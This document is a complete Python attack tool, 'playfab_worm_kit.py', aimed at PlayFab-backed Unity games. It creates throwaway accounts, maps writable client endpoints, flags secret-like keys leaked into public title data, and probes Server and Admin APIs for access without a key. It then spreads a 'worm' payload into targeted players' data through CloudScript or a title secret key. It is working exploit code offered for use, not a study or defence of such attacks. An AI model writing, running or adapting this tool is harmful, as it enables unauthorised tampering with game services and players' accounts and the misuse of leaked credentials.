#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
playfab_worm_kit.py

Surface probe + propagation kit for Unity titles backed by PlayFab.

    probe  : map every client-callable endpoint, decide which worm vector is live
    spread : push a payload across the chosen vector, per target

    python playfab_worm_kit.py probe  --title ABCD
    python playfab_worm_kit.py probe  --title ABCD --custom-id my_fixed_id
    python playfab_worm_kit.py spread --title ABCD --vector self --key Loadout \
        --payload payload.json
    python playfab_worm_kit.py spread --title ABCD --vector cloudscript \
        --function GiftXp --payload payload.json --targets ids.txt
    python playfab_worm_kit.py spread --title ABCD --vector server \
        --secret <TITLE_SECRET> --payload payload.json --targets ids.txt

Stdlib only. Python 3.9+.
"""

import argparse
import json
import os
import random
import string
import sys
import time
import urllib.error
import urllib.request

UA = "playfab_worm_kit/1.0"
GROUPS = ("Client", "Server", "Admin", "Object")


# ------------------------------------------------------------------ transport

def _url(title, group, method):
    return "https://%s.playfabapi.com/%s/%s" % (title, group, method)


def _post(url, payload, headers=None, timeout=25):
    """POST JSON. Returns (http_code, parsed_body). Never raises."""
    body = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("User-Agent", UA)
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace")
            code = r.status
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
        code = e.code
    except Exception as e:
        return 0, {"error": "network: %s" % e}
    try:
        return code, json.loads(raw)
    except Exception:
        return code, {"raw": raw[:2000]}


def is_ok(http_code, body):
    return http_code == 200 and isinstance(body, dict) and body.get("code") == 200


def err_of(body):
    if not isinstance(body, dict):
        return str(body)[:200]
    for k in ("errorMessage", "error", "raw"):
        if body.get(k):
            return str(body[k])[:200]
    return "code=%s" % body.get("code")


def rand_custom_id(n=12):
    alphabet = string.ascii_lowercase + string.digits
    return "worm_" + "".join(random.choice(alphabet) for _ in range(n))


# ------------------------------------------------------------------ client

class PlayFab(object):
    def __init__(self, title, delay=0.0):
        self.title = title
        self.ticket = None
        self.pfid = None
        self.entity_id = None
        self.entity_type = None
        self.entity_token = None
        self.delay = delay

    # -- raw calls -------------------------------------------------
    def call(self, group, method, payload=None, headers=None):
        if self.delay:
            time.sleep(self.delay)
        return _post(_url(self.title, group, method), payload or {}, headers)

    def client(self, method, payload=None, auth=True):
        h = {}
        if auth and self.ticket:
            h["X-Authorization"] = self.ticket
        return self.call("Client", method, payload, h)

    def server(self, method, payload=None, secret=None):
        h = {}
        if secret:
            h["X-SecretKey"] = secret
        return self.call("Server", method, payload, h)

    def admin(self, method, payload=None, secret=None):
        h = {}
        if secret:
            h["X-SecretKey"] = secret
        return self.call("Admin", method, payload, h)

    def obj(self, method, payload=None, entity_token=None):
        h = {}
        tok = entity_token or self.entity_token
        if tok:
            h["X-EntityToken"] = tok
        return self.call("Object", method, payload, h)

    # -- auth ------------------------------------------------------
    def login(self, custom_id=None, create=True):
        cid = custom_id or rand_custom_id()
        code, body = self.client("LoginWithCustomID", {
            "TitleId": self.title,
            "CustomId": cid,
            "CreateAccount": bool(create),
            "InfoRequestParameters": {
                "GetUserAccountInfo": True,
                "GetPlayerProfile": True,
                "GetUserData": True,
                "GetUserInventory": True,
            },
        }, auth=False)
        if not is_ok(code, body):
            return False, err_of(body)
        d = body.get("data") or {}
        self.ticket = d.get("SessionTicket")
        self.pfid = d.get("PlayFabId")
        et = d.get("EntityToken") or {}
        self.entity_token = et.get("EntityToken")
        ent = et.get("Entity") or {}
        self.entity_id = ent.get("Id")
        self.entity_type = ent.get("Type")
        self.custom_id = cid
        return True, d


# ------------------------------------------------------------------ probe

def _public_key_scan(data):
    """Title data is public by design. Flag keys that look like secrets leaked
    into the public bucket."""
    hits = []
    if not isinstance(data, dict):
        return hits
    needle = ("secret", "token", "password", "passwd", "apikey", "api_key",
              "private", "credential", "connectionstring")
    for k in data.keys():
        low = str(k).lower()
        for n in needle:
            if n in low:
                hits.append(k)
                break
    return hits


def run_probe(pf, out):
    findings = []

    def add(name, verdict, detail=""):
        findings.append({"check": name, "verdict": verdict, "detail": detail})
        print("  [%-6s] %-24s %s" % (verdict, name, detail))

    print("\n== authenticated ==")
    add("session", "OPEN" if pf.ticket else "CLOSED",
        "pfid=%s entity=%s" % (pf.pfid, pf.entity_type))

    # -- readable config -------------------------------------------
    code, body = pf.client("GetTitleData", {"Keys": []})
    if is_ok(code, body):
        td = (body.get("data") or {}).get("Data") or {}
        leaks = _public_key_scan(td)
        add("title_data", "OPEN", "%d cles publiques" % len(td))
        if leaks:
            add("title_data_leak", "FLAG", "cles suspectes: " + ", ".join(leaks[:6]))
            out["title_data"] = td
        elif td:
            out["title_data"] = td
    else:
        add("title_data", "ERROR", err_of(body))

    code, body = pf.client("GetCatalogItems", {"CatalogVersion": ""})
    if is_ok(code, body):
        items = (body.get("data") or {}).get("Catalog") or []
        add("catalog", "OPEN", "%d items" % len(items))
        if items:
            out["catalog"] = [
                {"id": i.get("ItemId"), "name": i.get("DisplayName"),
                 "price": (i.get("VirtualCurrencyPrices") or {})}
                for i in items[:200]
            ]
    else:
        add("catalog", "ERROR", err_of(body))

    code, body = pf.client("GetStoreItems", {"StoreId": ""})
    if is_ok(code, body):
        store = (body.get("data") or {}).get("Store") or []
        add("store", "OPEN", "%d entrées" % len(store))
    else:
        add("store", "ERROR", err_of(body))

    # -- client write primitives -----------------------------------
    marker = {"probe": "worm", "ts": int(time.time())}
    code, body = pf.client("UpdateUserData", {
        "Data": {"worm_probe": json.dumps(marker)},
        "Permission": "Public",
    })
    add("user_data_write", "OPEN" if is_ok(code, body) else "CLOSED", err_of(body))

    code, body = pf.client("GetUserData", {"Keys": ["worm_probe"]})
    if is_ok(code, body):
        got = ((body.get("data") or {}).get("Data") or {})
        add("user_data_read", "OPEN" if "worm_probe" in got else "MISS", "")

    if pf.entity_id and pf.entity_type:
        code, body = pf.obj("SetObjects", {
            "Entity": {"Id": pf.entity_id, "Type": pf.entity_type},
            "Objects": [{"ObjectName": "worm_probe", "DataObject": marker}],
        })
        add("object_store_write", "OPEN" if is_ok(code, body) else "CLOSED", err_of(body))

        code, body = pf.obj("GetObjects", {
            "Entity": {"Id": pf.entity_id, "Type": pf.entity_type},
            "ObjectName": "worm_probe",
        })
        add("object_store_read", "OPEN" if is_ok(code, body) else "CLOSED", err_of(body))

    # -- cloudscript ------------------------------------------------
    code, body = pf.client("ExecuteCloudScript", {
        "FunctionName": "__worm_probe_absent__",
        "FunctionParameter": {},
        "GeneratePlayStreamEvent": False,
    })
    msg = err_of(body).lower()
    if is_ok(code, body):
        add("cloudscript", "OPEN", "fonction executee")
    elif "not found" in msg or "could not find" in msg or "does not exist" in msg:
        add("cloudscript", "OPEN", "fonction inconnue mais API joignable")
    elif "not authorized" in msg or "forbidden" in msg or "disabled" in msg:
        add("cloudscript", "CLOSED", err_of(body))
    else:
        add("cloudscript", "ERROR", err_of(body))

    # -- photon -----------------------------------------------------
    code, body = pf.client("GetPhotonAuthenticationToken",
                           {"PhotonCustomAuthenticationId": pf.pfid or "x"})
    if is_ok(code, body):
        tok = (body.get("data") or {}).get("PhotonCustomAuthenticationToken")
        add("photon_token", "OPEN", "token=%s" % (str(tok)[:16] + "..." if tok else "vide"))
    else:
        add("photon_token", "CLOSED", err_of(body))

    # -- social / matchmaking ---------------------------------------
    code, body = pf.client("GetFriendsList", {"IncludeFacebookFriends": False})
    add("friends_list", "OPEN" if is_ok(code, body) else "CLOSED", err_of(body))

    code, body = pf.client("GetLeaderboard",
                           {"Stat": "xp", "StartPosition": 0, "MaxResultsCount": 5})
    add("leaderboard", "OPEN" if is_ok(code, body) else "CLOSED", err_of(body))

    code, body = pf.client("GetPlayerCombinedInfo", {
        "InfoRequestParameters": {"GetUserAccountInfo": True, "GetUserData": True,
                                  "GetUserInventory": True, "GetPlayerStatistics": True},
    })
    add("combined_info", "OPEN" if is_ok(code, body) else "CLOSED", err_of(body))

    # -- privileged groups without a secret -------------------------
    print("\n== privileged groups (no secret key) ==")
    for group, fn, meth in (("server", "GetTitleData", pf.server),
                            ("admin", "GetTitleData", pf.admin)):
        code, body = meth(fn, {"Keys": []})
        if is_ok(code, body):
            add("%s_no_secret" % group, "BREACH", "API %s ouverte sans cle" % group)
        else:
            add("%s_no_secret" % group, "CLOSED", err_of(body))

    code, body = pf.server("GrantItemsToUser",
                           {"PlayFabId": pf.pfid, "ItemIds": ["__worm_probe__"]})
    add("server_grant", "BREACH" if is_ok(code, body) else "CLOSED", err_of(body))

    # -- verdict ----------------------------------------------------
    st = {f["check"]: f["verdict"] for f in findings}
    vectors = []
    if st.get("cloudscript") == "OPEN":
        vectors.append("cloudscript")
    if st.get("object_store_write") == "OPEN":
        vectors.append("object-blob")
    if st.get("user_data_write") == "OPEN":
        vectors.append("self-persist")
    if st.get("photon_token") == "OPEN":
        vectors.append("photon-room")
    if st.get("server_api_no_secret") == "BREACH" or st.get("server_grant") == "BREACH":
        vectors.append("server-api-FULL")
    if st.get("admin_api_no_secret") == "BREACH":
        vectors.append("admin-api-FULL")

    out["findings"] = findings
    out["vectors"] = vectors
    out["pfid"] = pf.pfid
    out["custom_id"] = getattr(pf, "custom_id", None)
    out["entity"] = {"id": pf.entity_id, "type": pf.entity_type}

    print("\n== vecteurs de propagation disponibles ==")
    if vectors:
        for v in vectors:
            print("  + %s" % v)
    else:
        print("  aucun. le titre est verrouille cote client.")
    print("")
    return out


# ------------------------------------------------------------------ spread

def load_targets(path):
    ids = []
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            s = line.strip()
            if s and not s.startswith("#"):
                ids.append(s)
    return ids


def load_payload(path):
    if not path:
        return {}
    with open(path, "r", encoding="utf-8") as f:
        return json.load(f)


def spread(pf, vector, payload, targets, key, func, secret, delay):
    """Push the payload across the chosen vector. Returns per-target results."""
    results = []
    blob = json.dumps(payload, ensure_ascii=False)

    def record(target, ok, detail):
        results.append({"target": target, "ok": bool(ok), "detail": detail[:160]})
        print("  [%s] %-24s %s" % ("OK " if ok else "FAIL", str(target)[:24], detail[:100]))

    if vector == "self":
        key = key or "worm"
        code, body = pf.client("UpdateUserData", {
            "Data": {key: blob},
            "Permission": "Public",
        })
        record(pf.pfid, is_ok(code, body), err_of(body) if not is_ok(code, body) else key)

    elif vector == "object-blob":
        if pf.entity_id:
            code, body = pf.obj("SetObjects", {
                "Entity": {"Id": pf.entity_id, "Type": pf.entity_type},
                "Objects": [{"ObjectName": key or "worm", "DataObject": payload}],
            })
            record(pf.entity_id, is_ok(code, body), err_of(body))

    elif vector == "cloudscript":
        if not func:
            print("  !! --function requis pour le vecteur cloudscript")
            return results
        for t in targets:
            code, body = pf.client("ExecuteCloudScript", {
                "FunctionName": func,
                "FunctionParameter": {"target": t, "payload": payload},
                "GeneratePlayStreamEvent": False,
            })
            record(t, is_ok(code, body), "ok" if is_ok(code, body) else err_of(body))
            if delay:
                time.sleep(delay)

    elif vector == "server":
        if not secret:
            print("  !! --secret requis pour le vecteur server")
            return results
        for t in targets:
            code, body = pf.server("UpdateUserData", {
                "PlayFabId": t,
                "Data": {key or "worm": blob},
                "Permission": "Public",
            }, secret=secret)
            record(t, is_ok(code, body), "ok" if is_ok(code, body) else err_of(body))
            if delay:
                time.sleep(delay)

    else:
        print("  !! vecteur inconnu: %s" % vector)

    oks = sum(1 for r in results if r["ok"])
    print("\n  %d/%d cibles touchees" % (oks, len(results)))
    return results


# ------------------------------------------------------------------ main

def main(argv):
    ap = argparse.ArgumentParser(
        description="Probe and propagate across a PlayFab title surface.")
    ap.add_argument("mode", choices=["probe", "spread"])
    ap.add_argument("--title", required=True, help="PlayFab Title ID (from the client)")
    ap.add_argument("--custom-id", default=None,
                    help="fixed CustomId instead of a random one")
    ap.add_argument("--no-create", action="store_true",
                    help="do not create an account on login")
    ap.add_argument("--delay", type=float, default=0.35,
                    help="seconds between calls (default 0.35)")
    ap.add_argument("--out", default=None, help="write the JSON report here")
    ap.add_argument("--vector", default="self",
                    choices=["self", "object-blob", "cloudscript", "server"])
    ap.add_argument("--payload", default=None, help="JSON file carried by the worm")
    ap.add_argument("--targets", default=None, help="file with one PlayFabId per line")
    ap.add_argument("--key", default="worm", help="player-data key to write")
    ap.add_argument("--function", default=None, help="CloudScript function name")
    ap.add_argument("--secret", default=None, help="PlayFab title secret key, if you have it")
    args = ap.parse_args(argv)

    pf = PlayFab(args.title, delay=args.delay)
    ok, info = pf.login(args.custom_id, create=not args.no_create)
    if not ok:
        print("login echoue: %s" % info)
        return 2
    print("titre      %s" % args.title)
    print("playfabid  %s" % pf.pfid)
    print("entity     %s / %s" % (pf.entity_type, pf.entity_id))

    report = {"title": args.title, "mode": args.mode}

    if args.mode == "probe":
        run_probe(pf, report)
    else:
        payload = load_payload(args.payload)
        targets = load_targets(args.targets) if args.targets else [pf.pfid]
        report["vector"] = args.vector
        report["results"] = spread(pf, args.vector, payload, targets,
                                   args.key, args.function, args.secret, args.delay)

    if args.out:
        with open(args.out, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        print("rapport -> %s" % os.path.abspath(args.out))
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
